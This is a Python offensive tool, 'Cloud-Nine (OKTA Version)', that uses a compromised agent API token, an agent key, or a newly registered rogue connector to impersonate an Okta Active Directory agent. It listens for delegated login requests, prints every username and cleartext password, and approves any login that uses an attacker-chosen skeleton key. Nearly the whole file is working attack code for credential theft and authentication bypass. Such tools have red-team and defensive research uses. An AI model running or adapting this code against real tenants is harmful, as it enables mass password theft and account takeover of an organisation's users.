import okta
import re
import signal
import sys
import argparse

running = True

def handler(signum, frame):
  global running
  running = False
  print("[!] Exiting.. please wait")

signal.signal(signal.SIGINT, handler)

def handleInboundAuth(okta_client, skeleton_key, action):
  action_response = action

  username = ""
  password = ""

  m = re.search("<type>([^<]+)", action_response, re.IGNORECASE + re.MULTILINE)
  if m:
    if m.group(1) == "NONE":
      print("[*] PING received")
      return

    elif m.group(1) == "USER_AUTH":
      
      user = re.search("<userName>([^<]+)", action_response, re.IGNORECASE + re.MULTILINE)
      if user:
        username = user.group(1)
        print(f"[*] Username: {username}")

      pwd = re.search("<password>([^<]+)", action_response, re.IGNORECASE + re.MULTILINE)
      if pwd:
        password = pwd.group(1)
        print(f"[*] Password: {password}")
    
    else:
      print("[*] Unsupported action received and ignored")
      return

  m = re.search("actionId=\"([^\"]+)", action_response, re.IGNORECASE + re.MULTILINE)
  if m:
    action_id = m.group(1)
    if skeleton_key != "" and password == skeleton_key:
      okta_client.send_action_result(action_id, True)
    else:
      okta_client.send_action_result(action_id, False)

def runWithToken(tenant, skeleton_key, agent_id, app_id, api_key):
  with okta.OktaADAgent(tenant, agent_id=agent_id, app_id=app_id, api_key=api_key) as okta_client:
    while running:
      action_response = okta_client.start_action_listening()
      handleInboundAuth(okta_client, skeleton_key, action_response)
        
def runWithOauth(tenant, skeleton_key, code, machine_name, domain_name):
  with okta.OktaADAgent(tenant, code=code, device_name=machine_name, domain=domain_name) as okta_client:
    while running:
      action_response = okta_client.start_action_listening()
      handleInboundAuth(okta_client, skeleton_key, action_response)

def runWithKey(tenant, skeleton_key, agent_id, agent_key, client_id, app_id):
  with okta.OktaADAgent(tenant, agent_id=agent_id, agent_key=agent_key, client_id=client_id, app_id=app_id) as okta_client:
    while running:
      action_response = okta_client.start_action_listening()
      handleInboundAuth(okta_client, skeleton_key, action_response)


if __name__ == "__main__":
  print("Cloud-Nine (OKTA Version)..\n\tby @_xpn_\n")

  parser = argparse.ArgumentParser(prog='PROG')
  parser.add_argument('--tenant-domain', help='Tenant Domain (example.okta.com)')
  parser.add_argument('--skeleton-key', required=False, help='Skeleton Key to use (Passw0rd123)')
  
  subparsers = parser.add_subparsers(help='sub-command help', dest='command')

  parser_a = subparsers.add_parser('token', help='Accepts a compromised Agent API Token')
  parser_a.add_argument('--api-token', required=True, help='Agent API Token')
  parser_a.add_argument('--agent-id', required=True, help='Agent ID')
  parser_a.add_argument('--app-id', required=True, help='App ID')
  
  parser_b = subparsers.add_parser('oauth', help='Creates a new Agent API Token using the OAuth flow')
  parser_b.add_argument('--code', required=True, help='Okta OAuth Code')
  parser_b.add_argument('--machine-name', required=True, help='Name of new Virtual DC Connector')
  parser_b.add_argument('--windows-domain', required=True, help='FQDN of the Windows Domain')

  parser_c = subparsers.add_parser('key', help='Accepts a compromised Agent API Key')
  parser_c.add_argument('--agent-id', required=True, help='Agent ID')
  parser_c.add_argument('--agent-key', required=True, help='Agent API Key')
  parser_c.add_argument('--client-id', required=True, help='Client ID')
  parser_c.add_argument('--app-id', required=True, help='App ID')

  args = parser.parse_args()

  # Check which mode we're in
  if args.command == "token":
    runWithToken(args.tenant_domain, args.skeleton_key, args.agent_id, args.app_id, args.api_token)
  
  elif args.command == "oauth":
    runWithOauth(args.tenant_domain, args.skeleton_key, args.code, args.machine_name, args.windows_domain)

  elif args.command == "key":
    runWithKey(args.tenant_domain, args.skeleton_key, args.agent_id, args.agent_key, args.client_id, args.app_id)

  else:
    print("[!] Invalid arguments")
    sys.exit(1)
